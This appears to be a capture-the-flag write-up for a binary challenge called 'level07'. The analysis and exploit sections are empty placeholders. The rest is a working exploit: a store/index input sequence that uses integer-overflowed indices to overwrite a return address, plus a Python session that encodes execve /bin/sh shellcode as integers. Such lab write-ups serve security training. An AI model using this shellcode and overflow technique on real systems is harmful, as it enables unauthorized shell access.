# level07

1. [Analysis](#analysis)
2. [Exploit](#exploit)

## Analysis

Here everything concerning the analysis of the binary.

## Exploit

Here everything concerning the exploit description.


```console
store
2572684138
1
store
791636050
2
store
795371635
1073741827
store
2305714530
4
store
3452514787
5
store
128
1073741830
store
4294956360 (buf+4)
1073741938
quit
```




```python
>>> print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
j
 X�Rh//shh/bin��1�̀
>>> 0x99580b6a
2572684138
>>> 0x2f2f6852
791636050
>>> 0x2f686873
795371635
>>> 0x896e6962
2305714530
>>> 0xcdc931e3
3452514787
>>> 0x80
128

>>> (2**32 + (4 * 3)) / 4
1073741827
>>> (2**32 + (4 * 6)) / 4
1073741830
>>> (2**32 + (4 * 114)) / 4
1073741938

>>> 0xffffd548
4294956360
```